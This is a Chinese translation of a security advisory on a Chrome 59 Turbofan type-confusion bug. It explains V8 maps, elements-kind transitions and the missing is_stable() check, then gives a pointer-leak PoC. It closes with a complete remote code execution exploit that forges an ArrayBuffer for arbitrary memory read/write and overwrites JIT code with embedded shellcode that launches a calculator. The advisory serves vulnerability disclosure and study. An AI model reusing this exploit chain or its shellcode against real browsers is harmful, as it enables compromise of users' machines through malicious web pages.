> 原文链接: https://www.anquanke.com//post/id/86650 


# 【漏洞分析】Chrome Turbofan远程代码执行漏洞（含PoC）


                                阅读量   
                                **125230**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：securiteam.com
                                <br>原文地址：[https://blogs.securiteam.com/index.php/archives/3379](https://blogs.securiteam.com/index.php/archives/3379)

译文仅供参考，具体内容表达以及含义原文为准

**[![](https://p3.ssl.qhimg.com/t016d1b2dff0bccaa4b.jpg)](https://p3.ssl.qhimg.com/t016d1b2dff0bccaa4b.jpg)**

****

译者：[興趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**一、漏洞概要**

在这篇安全公告中，**我们介绍了Chrome 59版本浏览器中存在的一个类型混淆问题，这个问题最终会导致远程代码执行漏洞。**

Chrome浏览器中存在一个类型混淆漏洞。**该漏洞出现在用于优化JavaScript代码的turbofan编译器中**，导致访问程序在访问对象数组以及数值数组之间存在混淆，如果以数值形式来读取对象，那么就可以像访问数值那样访问对象（因此可以通过内存地址来读取这些值），反之亦然，也可以将数值写入到某个对象数组中，因而能够完全伪造对象。

<br>

**二、漏洞细节**

**2.1 背景知识**

**对象映射图（object map）**

每个对象都有一个映射图与之对应，用来表示对象的结构（键值以及值的类型）。具有相同结构的两个对象（但这两个对象的值不同）会使用相同的映射图。对象最常见的表示方法如下所示：

[![](https://p2.ssl.qhimg.com/t019f754bbeafb9edcd.png)](https://p2.ssl.qhimg.com/t019f754bbeafb9edcd.png)

如上图所示，映射图的字段（指向映射图的某个指针）保存着具体的对象图。两个固定的数组分别保存着额外的命名属性以及编号属性。编号属性通常也称为“元素（Elements）”。

**图转换**

当我们往对象中添加新的属性时，对象的图会处于失效状态。新的图会被创建，以适应新的对象结构，原始图中会添加一个转换描述符（transition descriptor），以描述如何将原始图转换为新的图。

例如：



```
Var obj = `{``}`; // Map M0 is created and assigned to the object
obj.x = 1; // Map M1 created, shows where to store the value x. A transition “x” is added to M0 with target M1.
obj.y=1; // Map M2 created, shows where to store the value y. A transition “y” is added to M1 with target M2.
```

随后，当内联缓存（inline cache）没有命中时，编译器可以利用这些转换描述符来重新优化函数代码。

**元素类型**

如上所述，对象的元素就是编号属性的值。这些值存储在对象指向的常规数组中。对象图中有个名为ElementsKind的特殊字段。这个字段描述了元素数组中的值是否为boxed、unboxed、contiguous、sparse还是其他值。仅通过元素类型进行区分的图不会通过转换关系进行连接。

**V8数组**

v8引擎中的数组属于有类型（typed）数组，可以使用“boxed”或者“unboxed”值。这基本上就决定了数组是否只能存储双精度值（整数也使用双精度来表示），或者也能存储更加复杂的值，在后一种情况下，这些值实际上是指向对象的指针。

简单描述一下这两种情况，如下所示：

[![](https://p1.ssl.qhimg.com/t01dfeee220a711cc82.png)](https://p1.ssl.qhimg.com/t01dfeee220a711cc82.png)

（数组本身的类型就决定了其值是boxed还是unboxed。）

因此，如果我们有一个数组（如上图左图所示），然后我们将某个复杂对象（如数组对象）分配给其中一个数组位置，那么整个数组就会变成boxed数组，所有已有值也会相应地变为boxed类型的值。

**V8优化**

V8编译器首先会分析javascript代码，以生成JIT编译代码，这一过程使用到了内联缓存（inline cache），同时对类型的处理没有那么严格。

从Google的V8官方文档中，我们找到如下解释：

“在首次执行时，V8会将JavaScript源代码直接编译成机器码。其中不存在中间字节码以及解释器。对属性的访问由内联缓存代码来处理，当V8执行时可能会使用其他机器执行来修改内联缓存代码……”

“V8会根据预测来优化属性访问过程，依据的是同一代码在未来访问所有对象时也会用到当前这个对象的类，然后会根据类中的信息来修改内联缓存代码，以便使用隐藏类。如果V8预测正确，那么属性的值就可以在一次操作中完成分配（或者读取）。如果预测错误，V8会修改代码来删除优化策略。”

因此，编译器只会编译适用于特定类型的那些代码。如果下一次代码（或者函数）所执行的类型与编译的类型不符，那么就会出现“内联缓存丢失”现象，导致编译器重新编译代码。

比如，假设我们有一个函数f，以及两个对象o1和o2，如下所示：



```
f(arg_obj) `{`
    return arg_obj.x;
`}`
var o1 = `{`“x”:1, “y”:2`}`
var o2 = `{`“x”:1, “t”:2`}`
```

当使用o1第一次调用函数时，编译器会生成如下代码：



```
(ecx holds the argument)
cmp [ecx + &lt;hidden class offset&gt;], &lt;cached o1 class&gt;
jne &lt;inline cache miss&gt; - this will execute compiler code
mov eax, [ecx + &lt;cached x offset&gt;]
```

如果使用o2再次调用这个函数，就会出现缓存丢失现象，编译器代码就会修改函数对应的JIT代码。

**2.2 具体漏洞**

**元素类型转换**

当出现缓存丢失现象并且编译器想重新优化函数代码时，编译器会使用已保存的转换关系，也会使用Map::FindElementsKindTransitionedMap函数，即时生成所需的ElementsKindTransitions（转换到仅在元素类型上有所差别的另一张图）。之所以使用即时方式完成这一过程，原因在于编译器只需要修改ElementsKind这个字段，而不需要完全修改整张图。

**稳定（stable）图**

当访问图所属元素的代码已完成优化，此时图就会被标记为稳定（stable）状态。

当优化编译器认为函数已经使用得差不多，可以进一步“减少”时（即编译器想进一步优化代码，减少代码大小），此时就会出现漏洞。此时，ReduceElementAccess函数会被调用，以减少对某个对象元素的访问。该函数会继续调用ComputeElementAccessInfos。

ComputeElementAccessInfos这个函数也会搜索可能的元素类型转换，以进一步优化代码。

问题在于这种转换会不会从一张稳定图中生成及使用。原因在于，如果使用了这样一种转换，那么它只会影响当前的函数，使用同一张稳定图的其他函数不会去考虑这种元素类型转换。

具体过程为：首先，某个函数以某种方式被优化减少，使其修改了某张稳定图的元素类型。然后，第二个函数以某种方式被优化减少，使其存储/加载了同一张稳定图中的某个属性。现在，这张图的某个对象被创建。第一个函数被调用，使用该对象作为函数参数，然后元素的类型会被修改。

第二个函数被调用，内联缓存并没有丢失（请记住，元素类型转换并不是转到另一类图的那种转换，因此不会造成缓存丢失）。

由于缓存没有丢失，因此函数会存储/加载属性值，就如同对象的元素仍处于unboxed状态一样，所以，这里我们能读取或写入一个对象指针数组。

然而，实际上在之前的commit中已经提到过这个问题：“如果需要元素类型转换时，请确保对象图处于不稳定状态”。

编译器做的工作如下：当函数发生缓存丢失现象时，编译器会检查是否可以使用元素类型转换来纠正缓存丢失。这个过程由KeyedStoreIC::StoreElementPolymorphicHandlers以及KeyedLoadIC::LoadElementPolymorphicHandlers来完成。对比commit前后的代码差异，我们发现如果用于转换的对象图处于稳定状态，那么它会被设置为不稳定状态（这意味着优化代码会被反编译），以确保转换会影响使用这张图的所有函数。

[![](https://p4.ssl.qhimg.com/t01e5387dac20d9c134.png)](https://p4.ssl.qhimg.com/t01e5387dac20d9c134.png)

因此，当第一次函数需要修改图的Elements Kind字段时，StoreElementPolymorphicHandlers会调用FindElementsKindTransitionedMap，查找元素类型转换关系，确保将对象图设置为不稳定状态，从而确保使用该图的代码会被去优化（deoptimized）处理，且未来的代码不会在该图上进行优化，以确保元素类型被正确处理。

那么，尽管如此，我们如何从稳定图中获得元素类型转换呢？

在解释这一点之前，我们需要了解过时图（deprecated map）的概念。过时图指的是该图的所有对象已经全部转变为另一张图的对象。这种图会被设置为不稳定、去优化状态，已经从转换树中移除（即从该图来或者到该图去的所有转换都已被删除）。

现在，如果我们查看ComputeElementAccessInfos源码，我们可以看到代码在调用FindElementsKindTransitionedMap之前会调用TryUpdate。

Tryupdate函数在收到一张过时图时，会尝试从同一棵“树”中查找另一张没有过时的图（即来自同一个根图并经过相同转换形成的图所构成的树），如果找到这种图，就会将其返回。

元素类型转换所对应的原始的对象图会在LoadElementPolymorphicHandlers中被设置为不稳定状态，并已经成为过时图。TryUpdate找到另一张图，然后会切换到这张图。但这张图从来没用于优化这个函数，因此也永远不会被设置为不稳定状态，因此，我们会再次从一张稳定图中得到元素类型转换。

调试版源代码中其实有一个检查过程，以确保不会从稳定图中生成转换关系（相关代码添加在之前的那个commit中），但这段代码显然不会对发行版产生影响：

[![](https://p4.ssl.qhimg.com/t0196b69e2bd749f759.png)](https://p4.ssl.qhimg.com/t0196b69e2bd749f759.png)

<br>

**三、简单的PoC**



```
&lt;script&gt;
// The function that will be optimized to change elements kind. Could be called the “evil” function.
function change_elements_kind(a)`{`
    a[0] = Array;
`}` 
// The function that will be optimized to read values directly as unboxed (and will therefore read pointers as values). Could also be called the “evil” function.
function read_as_unboxed()`{`    
    return evil[0];
`}`
// First, we want to make the function compile. Call it.
change_elements_kind(`{``}`);
// Construct a new object. Let’s call it’s map M0.
map_manipulator = new Array(1.0,2.3); 
// We add the property ‘x’. M0 will now have an ‘x’ transition to the new one, M1. 
map_manipulator.x = 7;
// Call the function with this object. A version of the function for this M1 will be compiled.
change_elements_kind(map_manipulator);
// Change the object’s ‘x’ property type. The previous ‘x’ transition from M0 to M1 will be removed, and M1 will be deprecated. A new map, M2, with a new ‘x’ transition from M0 is generated.
map_manipulator.x = `{``}`;
// Generate the object we’ll use for the vulnerability. Make sure it is of the M2 map.
evil = new Array(1.1,2.2);
evil.x = `{``}`;
x = new Array(`{``}`);
// Optimize change_elements_kind. 
// ReduceElementAccess will be called, and it will in turn call ComputeElementAccessInfos. In the code
// snippet below (same as before), we can see that the code runs through all the maps (Note: these are // maps that have already been used in this function and compiled), and tries to update each of them.
// When reaching M1, TryUpdate will see that it’s deprecated and look for a suitable non-deprecated 
// map, and will find M2, since it has the same properties. Therefore, an elements kind transition will be 
// created from M2.
for(var i = 0;i&lt;0x50000;i++)`{`
    change_elements_kind(x);
`}`   
// Optimize read_as_unboxed. Evil is currently an instance of the M2 map, so the function will be
// optimized for that, and for fast element access (evil only holds unboxed numbered properties).
for(var i = 0;i&lt;0x50000;i++)`{`
    read_as_unboxed();
`}`
// Trigger an elements kind change on evil. Since change_elements_kind was optimized with an
// elements kind transition, evil’s map will only be changed to reflect the new elements kind.
change_elements_kind(evil);
// Call read_as_unboxed. It’s still the same M2 so a cache miss does not occur, and the optimized 
// version is executed. However, that version assumes that the values in the elements array are unboxed
// so the Array constructor pointer (stored at position 0 in change_elements_kind) will be returned as a
// double.
alert(read_as_unboxed());
&lt;/script&gt;
```



**四、修复方法**

修复方法非常简单，只要在调用FindElementsKindTransitionedMap之前添加is_stable()检查函数即可。

[![](https://p4.ssl.qhimg.com/t01a80ac03bb38bbb7b.png)](https://p4.ssl.qhimg.com/t01a80ac03bb38bbb7b.png)

<br>

**五、完整的PoC**

使用如下PoC，我们可以攻击没有使用沙箱特性（–no-sandbox）的Chrome 59版本，弹出一个计算器（calc）。具体操作如下：

1、利用该漏洞来读取arraybuffer.proto的地址。

2、我们创建一个伪造的ArrayBuffer图（在图中使用arraybuffer proto的地址），利用该漏洞读取伪造图的地址。

3、利用伪造图的地址，我们可以根据该图创建一个伪造的ArrayBuffer对象，然后再次利用这个漏洞获取对象的地址。

4、我们利用这个漏洞，将指向伪造的ArrayBuffer的指针写入一个boxed元素数组，现在我们就可以从JS代码中正常访问我们伪造的ArrayBuffer。与此同时，我们可以编辑伪造的ArrayBuffer，将用户模式内存中的地址映射出来。因此现在我们掌握了完全的读取/写入权限。我们可以再一次利用这个漏洞，读取已编译函数的地址，然后使用读/写（R/W）权限将我们的shellcode覆盖这个地址，最后，调用这个函数执行我们的shellcode。



```
&lt;script&gt;
var shellcode = [0xe48348fc,0x00c0e8f0,0x51410000,0x51525041,0xd2314856,0x528b4865,0x528b4860,0x528b4818,0x728b4820,0xb70f4850,0x314d4a4a,0xc03148c9,0x7c613cac,0x41202c02,0x410dc9c1,0xede2c101,0x48514152,0x8b20528b,0x01483c42,0x88808bd0,0x48000000,0x6774c085,0x50d00148,0x4418488b,0x4920408b,0x56e3d001,0x41c9ff48,0x4888348b,0x314dd601,0xc03148c9,0xc9c141ac,0xc101410d,0xf175e038,0x244c034c,0xd1394508,0x4458d875,0x4924408b,0x4166d001,0x44480c8b,0x491c408b,0x8b41d001,0x01488804,0x415841d0,0x5a595e58,0x59415841,0x83485a41,0x524120ec,0x4158e0ff,0x8b485a59,0xff57e912,0x485dffff,0x000001ba,0x00000000,0x8d8d4800,0x00000101,0x8b31ba41,0xd5ff876f,0xa2b5f0bb,0xa6ba4156,0xff9dbd95,0xc48348d5,0x7c063c28,0xe0fb800a,0x47bb0575,0x6a6f7213,0x89415900,0x63d5ffda,0x00636c61]
var arraybuffer = new ArrayBuffer(20);
flag = 0;
function gc()`{`
    for(var i=0;i&lt;0x100000/0x10;i++)`{`
        new String;
    `}`
`}`
function d2u(num1,num2)`{`
    d = new Uint32Array(2);
    d[0] = num2;
    d[1] = num1;
    f = new Float64Array(d.buffer);
    return f[0];
`}`
function u2d(num)`{`
    f = new Float64Array(1);
    f[0] = num;
    d = new Uint32Array(f.buffer);
    return d[1] * 0x100000000 + d[0];
`}`
function change_to_float(intarr,floatarr)`{`
    var j = 0;
    for(var i = 0;i &lt; intarr.length;i = i+2)`{`
        var re = d2u(intarr[i+1],intarr[i]);
        floatarr[j] = re;
        j++;
    `}`
`}`
function change_elements_kind_array(a)`{`
    a[0] = Array;
`}`
optimizer3 = new Array(`{``}`); 
optimizer3.x3 = `{``}`;
change_elements_kind_array(optimizer3);
map_manipulator3 = new Array(1.1,2.2); 
map_manipulator3.x3 = 0x123;
change_elements_kind_array(map_manipulator3);
map_manipulator3.x3 = `{``}`;
evil3 = new Array(1.1,2.2);
evil3.x3 = `{``}`;
for(var i = 0;i&lt;0x100000;i++)`{`
    change_elements_kind_array(optimizer3);
`}`
/******************************* step 1    read ArrayBuffer __proto__ address   ***************************************/
function change_elements_kind_parameter(a,obj)`{`
    arguments;
    a[0] = obj;
`}`
optimizer4 = new Array(`{``}`); 
optimizer4.x4 = `{``}`;
change_elements_kind_parameter(optimizer4);
map_manipulator4 = new Array(1.1,2.2); 
map_manipulator4.x4 = 0x123;
change_elements_kind_parameter(map_manipulator4);
map_manipulator4.x4 = `{``}`;
evil4 = new Array(1.1,2.2);
evil4.x4 = `{``}`;
for(var i = 0;i&lt;0x100000;i++)`{`
    change_elements_kind_parameter(optimizer4,arraybuffer.__proto__);
`}`
function e4()`{`
    return evil4[0];
`}`
for(var i = 0;i&lt;0x100000;i++)`{`
    e4();
`}`
change_elements_kind_parameter(evil4,arraybuffer.__proto__);
ab_proto_addr = u2d(e4());
var nop = 0xdaba0000;
var ab_map_obj = [
    nop,nop,
    0x1f000008,0x000900c3,   //chrome 59
    //0x0d00000a,0x000900c4,  //chrome 61
    0x082003ff,0x0,
    nop,nop,   // use ut32.prototype replace it
    nop,nop,0x0,0x0
]
ab_constructor_addr = ab_proto_addr - 0x70;
ab_map_obj[0x6] = ab_proto_addr &amp; 0xffffffff;
ab_map_obj[0x7] = ab_proto_addr / 0x100000000;
ab_map_obj[0x8] = ab_constructor_addr &amp; 0xffffffff;
ab_map_obj[0x9] = ab_constructor_addr / 0x100000000;
float_arr = [];
gc();
var ab_map_obj_float = [1.1,1.1,1.1,1.1,1.1,1.1];
change_to_float(ab_map_obj,ab_map_obj_float);
/******************************* step 2    read fake_ab_map_ address   ***************************************/
change_elements_kind_parameter(evil4,ab_map_obj_float);
ab_map_obj_addr = u2d(e4())+0x40;
var fake_ab = [
    ab_map_obj_addr &amp; 0xffffffff, ab_map_obj_addr / 0x100000000,
    ab_map_obj_addr &amp; 0xffffffff, ab_map_obj_addr / 0x100000000,
    ab_map_obj_addr &amp; 0xffffffff, ab_map_obj_addr / 0x100000000,
    0x0,0x4000, /* buffer length */
    0x12345678,0x123,/* buffer address */
    0x4,0x0
]
var fake_ab_float = [1.1,1.1,1.1,1.1,1.1,1.1];
change_to_float(fake_ab,fake_ab_float);
/******************************* step 3    read fake_ArrayBuffer_address   ***************************************/
change_elements_kind_parameter(evil4,fake_ab_float);
fake_ab_float_addr = u2d(e4())+0x40;
/******************************* step 4 fake a ArrayBuffer   ***************************************/
fake_ab_float_addr_f = d2u(fake_ab_float_addr / 0x100000000,fake_ab_float_addr &amp; 0xffffffff).toString();
eval('function e3()`{`  evil3[1] = '+fake_ab_float_addr_f+';`}`')
for(var i = 0;i&lt;0x6000;i++)`{`
    e3();
`}`
change_elements_kind_array(evil3);
e3();
fake_arraybuffer = evil3[1];
if(fake_arraybuffer instanceof ArrayBuffer == true)`{`
`}`
fake_dv = new DataView(fake_arraybuffer,0,0x4000);
/******************************* step 5 Read a Function Address   ***************************************/
var func_body = "eval('');";
var function_to_shellcode = new Function("a",func_body);
change_elements_kind_parameter(evil4,function_to_shellcode);
shellcode_address_ref = u2d(e4()) + 0x38-1;
/**************************************  And now,we get arbitrary memory read write!!!!!!   ******************************************/
    function Read32(addr)`{`
        fake_ab_float[4] = d2u(addr / 0x100000000,addr &amp; 0xffffffff);
        return fake_dv.getUint32(0,true);
    `}`
    function Write32(addr,value)`{`
        fake_ab_float[4] = d2u(addr / 0x100000000,addr &amp; 0xffffffff);
        alert("w");
        fake_dv.setUint32(0,value,true);
    `}`
    shellcode_address = Read32(shellcode_address_ref) + Read32(shellcode_address_ref+0x4) * 0x100000000;;
    var addr = shellcode_address;
    fake_ab_float[4] = d2u(addr / 0x100000000,addr &amp; 0xffffffff);
    for(var i = 0; i &lt; shellcode.length;i++)`{`
        var value = shellcode[i];        
        fake_dv.setUint32(i * 4,value,true);
    `}`
    alert("boom");
    function_to_shellcode();
&lt;/script&gt;
```
